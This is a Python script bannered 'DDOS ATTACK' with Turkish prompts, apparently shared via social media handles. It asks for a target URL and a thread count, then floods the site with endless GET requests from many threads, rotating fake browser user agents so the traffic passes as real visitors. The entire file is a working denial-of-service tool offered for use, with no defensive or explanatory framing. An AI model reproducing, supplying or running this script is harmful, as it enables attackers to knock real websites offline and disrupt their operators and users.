import threading
import requests
import random
import sys

print("\033[95m")
print("""
########::'########:::'#######:::'######::::::::'###::::'########:'########::::'###:::::'######::'##:::'##:
 ##.... ##: ##.... ##:'##.... ##:'##... ##::::::'## ##:::... ##..::... ##..::::'## ##:::'##... ##: ##::'##::
 ##:::: ##: ##:::: ##: ##:::: ##: ##:::..::::::'##:. ##::::: ##::::::: ##:::::'##:. ##:: ##:::..:: ##:'##:::
 ##:::: ##: ##:::: ##: ##:::: ##:. ######:::::'##:::. ##:::: ##::::::: ##::::'##:::. ##: ##::::::: #####::::
 ##:::: ##: ##:::: ##: ##:::: ##::..... ##:::: #########:::: ##::::::: ##:::: #########: ##::::::: ##. ##:::
 ##:::: ##: ##:::: ##: ##:::: ##:'##::: ##:::: ##.... ##:::: ##::::::: ##:::: ##.... ##: ##::: ##: ##:. ##::
 ########:: ########::. #######::. ######::::: ##:::: ##:::: ##::::::: ##:::: ##:::: ##:. ######:: ##::. ##:
........:::........::::.......::::......::::::..:::::..:::::..::::::::..:::::..:::::..:::......:::..::::..::
""")
print("\033[0m")

target = input("Hedef siteyi gir (http://example.com): ")
threads_count = int(input("Kaç istek göndermek istiyorsun?: "))

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
]

def send_request():
    try:
        while True:
            headers = {"User-Agent": random.choice(user_agents)}
            response = requests.get(target, headers=headers)
            print(f"Gönderildi! Status Code: {response.status_code}")
    except requests.exceptions.RequestException:
        print("Bağlantı hatası! Hedef site yanıt vermiyor.")

threads = []
for _ in range(threads_count):
    thread = threading.Thread(target=send_request)
    thread.start()
    threads.append(thread)

for thread in threads:
    thread.join()

yazı = "\nInstagram: sanalfocus | Telegram: sanalfocus"
print("\033[95m" + yazı + "\033[0m")
